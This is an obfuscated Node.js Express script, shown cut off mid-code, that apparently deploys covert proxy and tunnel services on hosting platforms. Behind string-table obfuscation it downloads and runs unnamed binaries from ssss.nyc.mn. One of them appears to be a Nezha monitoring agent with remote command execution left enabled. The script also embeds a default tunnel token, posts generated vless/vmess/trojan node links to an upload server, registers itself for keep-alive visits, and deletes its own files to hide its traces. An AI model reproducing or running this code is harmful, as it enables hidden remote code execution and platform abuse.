const _0x459461=_0x292e;(function(_0x3c72ae,_0x1b90a7){const _0x3a7f7b=_0x292e,_0x1f19fc=_0x3c72ae();while(!![]){try{const _0x27e77d=-parseInt(_0x3a7f7b(0xf0))/0x1+-parseInt(_0x3a7f7b(0xd8))/0x2+parseInt(_0x3a7f7b(0x157))/0x3+parseInt(_0x3a7f7b(0x132))/0x4*(parseInt(_0x3a7f7b(0x117))/0x5)+parseInt(_0x3a7f7b(0xb2))/0x6*(-parseInt(_0x3a7f7b(0xe1))/0x7)+parseInt(_0x3a7f7b(0x116))/0x8*(parseInt(_0x3a7f7b(0xf4))/0x9)+-parseInt(_0x3a7f7b(0x113))/0xa*(-parseInt(_0x3a7f7b(0xba))/0xb);if(_0x27e77d===_0x1b90a7)break;else _0x1f19fc['push'](_0x1f19fc['shift']());}catch(_0x54b282){_0x1f19fc['push'](_0x1f19fc['shift']());}}}(_0x459c,0x6b38e));const express=require(_0x459461(0x10e)),app=express(),axios=require(_0x459461(0xad)),os=require('os'),fs=require('fs'),path=require(_0x459461(0x137)),{promisify}=require(_0x459461(0xef)),exec=promisify(require('child_process')[_0x459461(0xab)]),UPLOAD_URL=process['env'][_0x459461(0x11e)]||'',PROJECT_URL=process[_0x459461(0xe8)][_0x459461(0xbc)]||'',AUTO_ACCESS=process['env'][_0x459461(0xa3)]||![],FILE_PATH=process[_0x459461(0xe8)][_0x459461(0xc7)]||_0x459461(0x135),SUB_PATH=process['env'][_0x459461(0xdc)]||_0x459461(0x12e),PORT=process[_0x459461(0xe8)][_0x459461(0x101)]||process[_0x459461(0xe8)][_0x459461(0x140)]||0xbb8,UUID=process[_0x459461(0xe8)][_0x459461(0x103)]||'bc97f674-c578-4940-9234-0a1da46041b9',NEZHA_SERVER=process[_0x459461(0xe8)][_0x459461(0xe2)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x459461(0xe8)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x459461(0xe8)]['ARGO_DOMAIN']||_0x459461(0xa7),ARGO_AUTH=process['env'][_0x459461(0xfd)]||_0x459461(0xc6),ARGO_PORT=process[_0x459461(0xe8)]['ARGO_PORT']||0x1f41,CFIP=process[_0x459461(0xe8)]['CFIP']||_0x459461(0x152),CFPORT=process[_0x459461(0xe8)][_0x459461(0x114)]||0x1bb,NAME=process[_0x459461(0xe8)][_0x459461(0xc8)]||'Galaxy';!fs[_0x459461(0x122)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x459461(0xaa)](FILE_PATH+_0x459461(0xfa))):console[_0x459461(0xaa)](FILE_PATH+_0x459461(0xb9));function generateRandomName(){const _0x1d2670=_0x459461,_0x52f0ef=_0x1d2670(0x110);let _0x4ae1e7='';for(let _0x550620=0x0;_0x550620<0x6;_0x550620++){_0x4ae1e7+=_0x52f0ef['charAt'](Math[_0x1d2670(0xec)](Math[_0x1d2670(0xcc)]()*_0x52f0ef['length']));}return _0x4ae1e7;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x459461(0x13c)](FILE_PATH,phpName),webPath=path[_0x459461(0x13c)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x459461(0x13c)](FILE_PATH,_0x459461(0x14d)),listPath=path[_0x459461(0x13c)](FILE_PATH,'list.txt'),bootLogPath=path[_0x459461(0x13c)](FILE_PATH,_0x459461(0x13e)),configPath=path['join'](FILE_PATH,_0x459461(0xb7));function deleteNodes(){const _0x5266b6=_0x459461;try{if(!UPLOAD_URL)return;if(!fs[_0x5266b6(0x122)](subPath))return;let _0x30934c;try{_0x30934c=fs[_0x5266b6(0x14b)](subPath,_0x5266b6(0xe9));}catch{return null;}const _0x46f3c6=Buffer[_0x5266b6(0x154)](_0x30934c,_0x5266b6(0x13d))[_0x5266b6(0x134)]('utf-8'),_0xef1a06=_0x46f3c6['split']('\x0a')[_0x5266b6(0xd1)](_0x1fbff4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5266b6(0xfe)](_0x1fbff4));if(_0xef1a06[_0x5266b6(0x124)]===0x0)return;return axios[_0x5266b6(0x9b)](UPLOAD_URL+_0x5266b6(0xaf),JSON[_0x5266b6(0x10f)]({'nodes':_0xef1a06}),{'headers':{'Content-Type':_0x5266b6(0xbb)}})['catch'](_0x2a197c=>{return null;}),null;}catch(_0x2823e6){return null;}}function cleanupOldFiles(){try{const _0xabd654=fs['readdirSync'](FILE_PATH);_0xabd654['forEach'](_0x427b59=>{const _0x2a751a=_0x292e,_0x479890=path[_0x2a751a(0x13c)](FILE_PATH,_0x427b59);try{const _0x40f9aa=fs[_0x2a751a(0xc3)](_0x479890);_0x40f9aa[_0x2a751a(0xac)]()&&fs[_0x2a751a(0xda)](_0x479890);}catch(_0x28fe11){}});}catch(_0x20fd49){}}async function generateConfig(){const _0x2bf23a=_0x459461,_0x468483={'log':{'access':_0x2bf23a(0x141),'error':_0x2bf23a(0x141),'loglevel':_0x2bf23a(0x11b)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2bf23a(0xc5),'settings':{'clients':[{'id':UUID,'flow':_0x2bf23a(0xfb)}],'decryption':_0x2bf23a(0x11b),'fallbacks':[{'dest':0xbb9},{'path':_0x2bf23a(0x12b),'dest':0xbba},{'path':_0x2bf23a(0x97),'dest':0xbbb},{'path':_0x2bf23a(0x139),'dest':0xbbc}]},'streamSettings':{'network':_0x2bf23a(0xb4)}},{'port':0xbb9,'listen':_0x2bf23a(0x156),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x2bf23a(0x11b)},'streamSettings':{'network':_0x2bf23a(0xb4),'security':'none'}},{'port':0xbba,'listen':_0x2bf23a(0x156),'protocol':_0x2bf23a(0xc5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2bf23a(0x11b),'wsSettings':{'path':_0x2bf23a(0x12b)}},'sniffing':{'enabled':!![],'destOverride':[_0x2bf23a(0xf6),_0x2bf23a(0xca),_0x2bf23a(0x129)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2bf23a(0x156),'protocol':_0x2bf23a(0x15b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2bf23a(0x97)}},'sniffing':{'enabled':!![],'destOverride':[_0x2bf23a(0xf6),_0x2bf23a(0xca),_0x2bf23a(0x129)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2bf23a(0x156),'protocol':_0x2bf23a(0xb8),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2bf23a(0x11b),'wsSettings':{'path':_0x2bf23a(0x139)}},'sniffing':{'enabled':!![],'destOverride':[_0x2bf23a(0xf6),_0x2bf23a(0xca),_0x2bf23a(0x129)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x2bf23a(0x104),'tag':_0x2bf23a(0x118)},{'protocol':_0x2bf23a(0xa1),'tag':'block'}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x2bf23a(0xb7)),JSON[_0x2bf23a(0x10f)](_0x468483,null,0x2));}function getSystemArchitecture(){const _0x10ac15=_0x459461,_0x125b05=os['arch']();return _0x125b05===_0x10ac15(0x119)||_0x125b05===_0x10ac15(0xd3)||_0x125b05===_0x10ac15(0xcf)?_0x10ac15(0x119):_0x10ac15(0xdb);}function _0x292e(_0x4d423f,_0x363e21){_0x4d423f=_0x4d423f-0x96;const _0x459cc6=_0x459c();let _0x292ea1=_0x459cc6[_0x4d423f];return _0x292ea1;}function downloadFile(_0x862d4d,_0x40dae3,_0x44ab7a){const _0x26fd96=_0x459461,_0x13e3b7=_0x862d4d;!fs[_0x26fd96(0x122)](FILE_PATH)&&fs[_0x26fd96(0xe0)](FILE_PATH,{'recursive':!![]});const _0x452a13=fs[_0x26fd96(0x9d)](_0x13e3b7);axios({'method':_0x26fd96(0x15c),'url':_0x40dae3,'responseType':_0x26fd96(0x109)})[_0x26fd96(0x111)](_0x45ba5d=>{const _0x27afd6=_0x26fd96;_0x45ba5d[_0x27afd6(0x147)][_0x27afd6(0x105)](_0x452a13),_0x452a13['on'](_0x27afd6(0xa6),()=>{const _0x10c8e4=_0x27afd6;_0x452a13['close'](),console[_0x10c8e4(0xaa)](_0x10c8e4(0x13a)+path[_0x10c8e4(0x128)](_0x13e3b7)+_0x10c8e4(0x145)),_0x44ab7a(null,_0x13e3b7);}),_0x452a13['on'](_0x27afd6(0xb6),_0x1bf9a2=>{const _0x4281c2=_0x27afd6;fs['unlink'](_0x13e3b7,()=>{});const _0x287d3c=_0x4281c2(0x13a)+path[_0x4281c2(0x128)](_0x13e3b7)+_0x4281c2(0xf8)+_0x1bf9a2['message'];console[_0x4281c2(0xb6)](_0x287d3c),_0x44ab7a(_0x287d3c);});})[_0x26fd96(0xde)](_0x1b61ac=>{const _0x54656e=_0x26fd96,_0x593493=_0x54656e(0x13a)+path[_0x54656e(0x128)](_0x13e3b7)+'\x20failed:\x20'+_0x1b61ac[_0x54656e(0xd5)];console[_0x54656e(0xb6)](_0x593493),_0x44ab7a(_0x593493);});}async function downloadFilesAndRun(){const _0x1b9372=_0x459461,_0x4a93eb=getSystemArchitecture(),_0x3673bb=getFilesForArchitecture(_0x4a93eb);if(_0x3673bb[_0x1b9372(0x124)]===0x0){console[_0x1b9372(0xaa)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x4a8fc9=_0x3673bb['map'](_0x3b9962=>{return new Promise((_0x58b90f,_0x568c2)=>{const _0x5f0987=_0x292e;downloadFile(_0x3b9962[_0x5f0987(0xe6)],_0x3b9962['fileUrl'],(_0x5b1b38,_0x236579)=>{_0x5b1b38?_0x568c2(_0x5b1b38):_0x58b90f(_0x236579);});});});try{await Promise['all'](_0x4a8fc9);}catch(_0x25f212){console[_0x1b9372(0xb6)](_0x1b9372(0xb5),_0x25f212);return;}function _0x2a9f99(_0x4b8079){const _0x5aa615=_0x1b9372,_0x3b1ca1=0x1fd;_0x4b8079[_0x5aa615(0x12d)](_0x2cf877=>{const _0x187ebe=_0x5aa615;fs['existsSync'](_0x2cf877)&&fs[_0x187ebe(0x10b)](_0x2cf877,_0x3b1ca1,_0x384b70=>{const _0x4e4d80=_0x187ebe;_0x384b70?console[_0x4e4d80(0xb6)](_0x4e4d80(0x146)+_0x2cf877+':\x20'+_0x384b70):console[_0x4e4d80(0xaa)](_0x4e4d80(0xa9)+_0x2cf877+':\x20'+_0x3b1ca1['toString'](0x8));});});}const _0x3cfbf6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2a9f99(_0x3cfbf6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x398f25=NEZHA_SERVER[_0x1b9372(0x144)](':')?NEZHA_SERVER[_0x1b9372(0xb1)](':')[_0x1b9372(0xdd)]():'',_0x264c13=new Set([_0x1b9372(0x14a),_0x1b9372(0xd2),'2096',_0x1b9372(0x14c),_0x1b9372(0x11d),_0x1b9372(0x13f)]),_0x58f2c7=_0x264c13[_0x1b9372(0xae)](_0x398f25)?_0x1b9372(0x112):_0x1b9372(0x15a),_0x32e116=_0x1b9372(0xa4)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x1b9372(0x150)+_0x58f2c7+_0x1b9372(0x11a)+UUID;fs['writeFileSync'](path[_0x1b9372(0x13c)](FILE_PATH,_0x1b9372(0xfc)),_0x32e116);const _0x9f58fc=_0x1b9372(0x153)+phpPath+_0x1b9372(0xcb)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x9f58fc),console[_0x1b9372(0xaa)](phpName+'\x20is\x20running'),await new Promise(_0x1eb16c=>setTimeout(_0x1eb16c,0x3e8));}catch(_0x2436e5){console[_0x1b9372(0xb6)](_0x1b9372(0x115)+_0x2436e5);}}else{let _0x518c16='';const _0x40b44c=[_0x1b9372(0x14a),_0x1b9372(0xd2),_0x1b9372(0xe7),_0x1b9372(0x14c),_0x1b9372(0x11d),'2053'];_0x40b44c[_0x1b9372(0x144)](NEZHA_PORT)&&(_0x518c16=_0x1b9372(0x99));const _0x1f985e=_0x1b9372(0x153)+npmPath+_0x1b9372(0x106)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1b9372(0x107)+NEZHA_KEY+'\x20'+_0x518c16+_0x1b9372(0xff);try{await exec(_0x1f985e),console[_0x1b9372(0xaa)](npmName+'\x20is\x20running'),await new Promise(_0x558f08=>setTimeout(_0x558f08,0x3e8));}catch(_0x2226cc){console['error']('npm\x20running\x20error:\x20'+_0x2226cc);}}}else console[_0x1b9372(0xaa)](_0x1b9372(0x155));const _0x28635c='nohup\x20'+webPath+_0x1b9372(0xd0)+FILE_PATH+_0x1b9372(0x123);try{await exec(_0x28635c),console['log'](webName+_0x1b9372(0xbd)),await new Promise(_0x4c8646=>setTimeout(_0x4c8646,0x3e8));}catch(_0x59c5c6){console[_0x1b9372(0xb6)](_0x1b9372(0xbe)+_0x59c5c6);}if(fs[_0x1b9372(0x122)](botPath)){let _0x347792;if(ARGO_AUTH[_0x1b9372(0xa5)](/^[A-Z0-9a-z=]{120,250}$/))_0x347792=_0x1b9372(0x148)+ARGO_AUTH;else ARGO_AUTH[_0x1b9372(0xa5)](/TunnelSecret/)?_0x347792=_0x1b9372(0x159)+FILE_PATH+_0x1b9372(0x102):_0x347792=_0x1b9372(0xea)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1b9372(0x153)+botPath+'\x20'+_0x347792+_0x1b9372(0xc1)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x40ba0d=>setTimeout(_0x40ba0d,0x7d0));}catch(_0x21715b){console[_0x1b9372(0xb6)](_0x1b9372(0xc9)+_0x21715b);}}await new Promise(_0x4a7342=>setTimeout(_0x4a7342,0x1388));}function getFilesForArchitecture(_0x3db943){const _0x38378c=_0x459461;let _0x7342;_0x3db943==='arm'?_0x7342=[{'fileName':webPath,'fileUrl':_0x38378c(0xf9)},{'fileName':botPath,'fileUrl':_0x38378c(0x149)}]:_0x7342=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x38378c(0xe3)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x444255=_0x3db943===_0x38378c(0x119)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x7342['unshift']({'fileName':npmPath,'fileUrl':_0x444255});}else{const _0x5d83a4=_0x3db943===_0x38378c(0x119)?_0x38378c(0xb3):_0x38378c(0x136);_0x7342[_0x38378c(0x9f)]({'fileName':phpPath,'fileUrl':_0x5d83a4});}}return _0x7342;}function argoType(){const _0xb762bd=_0x459461;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xb762bd(0xaa)](_0xb762bd(0xc4));return;}if(ARGO_AUTH[_0xb762bd(0x144)]('TunnelSecret')){fs[_0xb762bd(0x98)](path[_0xb762bd(0x13c)](FILE_PATH,_0xb762bd(0xce)),ARGO_AUTH);const _0x439cbe='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0xb762bd(0xb1)]('\x22')[0xb]+_0xb762bd(0xa2)+path[_0xb762bd(0x13c)](FILE_PATH,_0xb762bd(0xce))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0xb762bd(0x127)+ARGO_PORT+_0xb762bd(0x12a);fs[_0xb762bd(0x98)](path[_0xb762bd(0x13c)](FILE_PATH,_0xb762bd(0xd9)),_0x439cbe);}else console[_0xb762bd(0xaa)](_0xb762bd(0x9a));}async function extractDomains(){const _0x13ada2=_0x459461;let _0x426389;if(ARGO_AUTH&&ARGO_DOMAIN)_0x426389=ARGO_DOMAIN,console[_0x13ada2(0xaa)](_0x13ada2(0xc0),_0x426389),await _0x911806(_0x426389);else try{const _0x70f1e=fs['readFileSync'](path[_0x13ada2(0x13c)](FILE_PATH,'boot.log'),_0x13ada2(0xe9)),_0x1a4603=_0x70f1e['split']('\x0a'),_0x144da3=[];_0x1a4603[_0x13ada2(0x12d)](_0x373114=>{const _0x203bb0=_0x13ada2,_0x16a690=_0x373114[_0x203bb0(0xa5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x16a690){const _0x49181c=_0x16a690[0x1];_0x144da3[_0x203bb0(0xcd)](_0x49181c);}});if(_0x144da3[_0x13ada2(0x124)]>0x0)_0x426389=_0x144da3[0x0],console['log']('ArgoDomain:',_0x426389),await _0x911806(_0x426389);else{console[_0x13ada2(0xaa)](_0x13ada2(0x151)),fs[_0x13ada2(0xda)](path['join'](FILE_PATH,_0x13ada2(0x13e)));async function _0x26b79e(){const _0x2d3565=_0x13ada2;try{process[_0x2d3565(0xa8)]===_0x2d3565(0x158)?await exec(_0x2d3565(0xd4)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x2d3565(0x10a)](0x0)+']'+botName[_0x2d3565(0x142)](0x1)+_0x2d3565(0x126));}catch(_0x3a76a9){}}_0x26b79e(),await new Promise(_0x3b411f=>setTimeout(_0x3b411f,0xbb8));const _0x59c924=_0x13ada2(0xea)+FILE_PATH+_0x13ada2(0x11f)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x59c924+_0x13ada2(0xc1)),console[_0x13ada2(0xaa)](botName+_0x13ada2(0xbd)),await new Promise(_0x156a7d=>setTimeout(_0x156a7d,0xbb8)),await extractDomains();}catch(_0x4b9d06){console['error'](_0x13ada2(0xc9)+_0x4b9d06);}}}catch(_0x26b515){console[_0x13ada2(0xb6)](_0x13ada2(0x10c),_0x26b515);}async function _0x1c7e55(){const _0x171014=_0x13ada2;try{const _0x45eaa4=await axios[_0x171014(0x15c)]('https://ipapi.co/json',{'timeout':0xbb8});if(_0x45eaa4[_0x171014(0x147)]&&_0x45eaa4['data']['country_code']&&_0x45eaa4['data'][_0x171014(0xe5)])return _0x45eaa4[_0x171014(0x147)][_0x171014(0x138)]+'_'+_0x45eaa4[_0x171014(0x147)][_0x171014(0xe5)];}catch(_0x4d8d58){try{const _0x4d592f=await axios[_0x171014(0x15c)]('http://ip-api.com/json',{'timeout':0xbb8});if(_0x4d592f[_0x171014(0x147)]&&_0x4d592f[_0x171014(0x147)][_0x171014(0x12f)]===_0x171014(0x14e)&&_0x4d592f[_0x171014(0x147)][_0x171014(0xf3)]&&_0x4d592f[_0x171014(0x147)]['org'])return _0x4d592f[_0x171014(0x147)]['countryCode']+'_'+_0x4d592f['data'][_0x171014(0xe5)];}catch(_0x28c854){}}return _0x171014(0xa0);}async function _0x911806(_0x5dbf24){const _0x360f21=await _0x1c7e55(),_0x507e95=NAME?NAME+'-'+_0x360f21:_0x360f21;return new Promise(_0x76447=>{setTimeout(()=>{const _0xfb3f50=_0x292e,_0x3e8a69={'v':'2','ps':''+_0x507e95,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x5dbf24,'path':_0xfb3f50(0x14f),'tls':_0xfb3f50(0xca),'sni':_0x5dbf24,'alpn':'','fp':_0xfb3f50(0x131)},_0xbda10e=_0xfb3f50(0x96)+UUID+'@'+CFIP+':'+CFPORT+_0xfb3f50(0x10d)+_0x5dbf24+'&fp=firefox&type=ws&host='+_0x5dbf24+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x507e95+'\x0a\x0avmess://'+Buffer[_0xfb3f50(0x154)](JSON['stringify'](_0x3e8a69))['toString'](_0xfb3f50(0x13d))+_0xfb3f50(0xc2)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x5dbf24+'&fp=firefox&type=ws&host='+_0x5dbf24+_0xfb3f50(0x100)+_0x507e95+_0xfb3f50(0xee);console[_0xfb3f50(0xaa)](Buffer[_0xfb3f50(0x154)](_0xbda10e)['toString'](_0xfb3f50(0x13d))),fs[_0xfb3f50(0x98)](subPath,Buffer[_0xfb3f50(0x154)](_0xbda10e)['toString']('base64')),console[_0xfb3f50(0xaa)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4f70f5,_0x1b633e)=>{const _0xc34f11=_0xfb3f50,_0x27a1f3=Buffer['from'](_0xbda10e)[_0xc34f11(0x134)](_0xc34f11(0x13d));_0x1b633e[_0xc34f11(0x125)](_0xc34f11(0xd7),'text/plain;\x20charset=utf-8'),_0x1b633e[_0xc34f11(0x11c)](_0x27a1f3);}),_0x76447(_0xbda10e);},0x7d0);});}}function _0x459c(){const _0x31f155=['true','209410xzHdyS','CFPORT','php\x20running\x20error:\x20','1004816KRzNJh','2289340HJHEUU','direct','arm','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','none','send','2083','UPLOAD_URL','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Error\x20in\x20startserver:','Nodes\x20uploaded\x20successfully','existsSync','/config.json\x20>/dev/null\x202>&1\x20&','length','set','\x22\x20>\x20/dev/null\x202>&1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','basename','quic','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/vless-argo','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','forEach','sub','status','promises','firefox','4GmkhxV','Unhandled\x20error\x20in\x20startserver:','toString','.tmp','https://amd64.ssss.nyc.mn/v1','path','country_code','/trojan-argo','Download\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','join','base64','boot.log','2053','PORT','/dev/null','substring','clear','includes','\x20successfully','Empowerment\x20failed\x20for\x20','data','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://arm64.ssss.nyc.mn/bot','443','readFileSync','2087','sub.txt','success','/vmess-argo?ed=2560','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','saas.sin.fan','nohup\x20','from','NEZHA\x20variable\x20is\x20empty,skip\x20running','127.0.0.1','238863KQlIEh','win32','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','false','vmess','get','\x0avless://','/vmess-argo','writeFileSync','--tls','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','post','/api/add-nodes','createWriteStream','response','unshift','Unknown','blackhole','\x0a\x20\x20credentials-file:\x20','AUTO_ACCESS','\x0aclient_secret:\x20','match','finish','galaxyfr.xiangyu-group.com.cn','platform','Empowerment\x20success\x20for\x20','log','exec','isFile','axios','has','/api/delete-nodes','del\x20/f\x20/q\x20','split','20730qzfRoy','https://arm64.ssss.nyc.mn/v1','tcp','Error\x20downloading\x20files:','error','config.json','trojan','\x20already\x20exists','352zJEefs','application/json','PROJECT_URL','\x20is\x20running','web\x20running\x20error:\x20','\x20>/dev/null\x202>&1','ARGO_DOMAIN:','\x20>/dev/null\x202>&1\x20&','\x0a\x0atrojan://','statSync','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','vless','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiM2NjNzU1NjAtNzVhNS00ZjA4LWIwY2YtNzgwNWZjY2Y1YTIzIiwicyI6IllUazJZakEwTmpJdFpUZ3pOUzAwTVdZMExXRTBOVEl0WW1RMU9HRTJOMk5qTlRjdyJ9','FILE_PATH','NAME','Error\x20executing\x20command:\x20','tls','\x20-c\x20\x22','random','push','tunnel.json','aarch64','\x20-c\x20','filter','8443','arm64','taskkill\x20/f\x20/im\x20','message','Subscription\x20uploaded\x20successfully','Content-Type','665140asSuXY','tunnel.yml','unlinkSync','amd','SUB_PATH','pop','catch','automatic\x20access\x20task\x20added\x20successfully','mkdirSync','833Emcfml','NEZHA_SERVER','https://amd64.ssss.nyc.mn/bot','readFile','org','fileName','2096','env','utf-8','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','listen','floor','http\x20server\x20is\x20running\x20on\x20port:','\x0a\x20\x20\x20\x20','util','150306EEoELp','https://oooo.serv00.net/add-url','Skipping\x20adding\x20automatic\x20access\x20task','countryCode','9zLhdGu','\x20>\x20nul\x202>&1','http','App\x20is\x20running','\x20failed:\x20','https://arm64.ssss.nyc.mn/web','\x20is\x20created','xtls-rprx-vision','config.yaml','ARGO_AUTH','test','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','&path=%2Ftrojan-argo%3Fed%3D2560#','SERVER_PORT','/tunnel.yml\x20run','UUID','freedom','pipe','\x20-s\x20','\x20-p\x20','index.html','stream','charAt','chmod','Error\x20reading\x20boot.log:','?encryption=none&security=tls&sni=','express','stringify','abcdefghijklmnopqrstuvwxyz','then'];_0x459c=function(){return _0x31f155;};return _0x459c();}async function uploadNodes(){const _0x3d8c64=_0x459461;if(UPLOAD_URL&&PROJECT_URL){const _0x53c98b=PROJECT_URL+'/'+SUB_PATH,_0x477f57={'subscription':[_0x53c98b]};try{const _0x3c71e5=await axios[_0x3d8c64(0x9b)](UPLOAD_URL+'/api/add-subscriptions',_0x477f57,{'headers':{'Content-Type':_0x3d8c64(0xbb)}});return _0x3c71e5&&_0x3c71e5['status']===0xc8?(console[_0x3d8c64(0xaa)](_0x3d8c64(0xd6)),_0x3c71e5):null;}catch(_0x2305cb){if(_0x2305cb[_0x3d8c64(0x9e)]){if(_0x2305cb[_0x3d8c64(0x9e)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3d8c64(0x122)](listPath))return;const _0x1f99f7=fs[_0x3d8c64(0x14b)](listPath,_0x3d8c64(0xe9)),_0xe03de2=_0x1f99f7[_0x3d8c64(0xb1)]('\x0a')[_0x3d8c64(0xd1)](_0x5da988=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3d8c64(0xfe)](_0x5da988));if(_0xe03de2[_0x3d8c64(0x124)]===0x0)return;const _0x581647=JSON[_0x3d8c64(0x10f)]({'nodes':_0xe03de2});try{const _0x4f5181=await axios[_0x3d8c64(0x9b)](UPLOAD_URL+_0x3d8c64(0x9c),_0x581647,{'headers':{'Content-Type':_0x3d8c64(0xbb)}});return _0x4f5181&&_0x4f5181[_0x3d8c64(0x12f)]===0xc8?(console[_0x3d8c64(0xaa)](_0x3d8c64(0x121)),_0x4f5181):null;}catch(_0x581da0){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3ec9cf=_0x292e,_0x277aee=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x277aee[_0x3ec9cf(0xcd)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x277aee[_0x3ec9cf(0xcd)](phpPath);process[_0x3ec9cf(0xa8)]===_0x3ec9cf(0x158)?exec(_0x3ec9cf(0xb0)+_0x277aee['join']('\x20')+_0x3ec9cf(0xf5),_0x769bd5=>{const _0x1b6e28=_0x3ec9cf;console['clear'](),console[_0x1b6e28(0xaa)](_0x1b6e28(0xf7)),console[_0x1b6e28(0xaa)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x277aee[_0x3ec9cf(0x13c)]('\x20')+_0x3ec9cf(0xbf),_0x1ce643=>{const _0x1e2010=_0x3ec9cf;console[_0x1e2010(0x143)](),console['log'](_0x1e2010(0xf7)),console[_0x1e2010(0xaa)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x25d2d3=_0x459461;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x25d2d3(0xaa)](_0x25d2d3(0xf2));return;}try{const _0x47204e=await axios[_0x25d2d3(0x9b)](_0x25d2d3(0xf1),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x25d2d3(0xbb)}});return console['log'](_0x25d2d3(0xdf)),_0x47204e;}catch(_0x5e0a00){return console[_0x25d2d3(0xb6)](_0x25d2d3(0x13b)+_0x5e0a00[_0x25d2d3(0xd5)]),null;}}async function startserver(){const _0x30986f=_0x459461;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x100916){console[_0x30986f(0xb6)](_0x30986f(0x120),_0x100916);}}startserver()['catch'](_0x3bf27f=>{const _0xe25313=_0x459461;console[_0xe25313(0xb6)](_0xe25313(0x133),_0x3bf27f);}),app[_0x459461(0x15c)]('/',async function(_0x561b28,_0x1b41cb){const _0x27060d=_0x459461;try{const 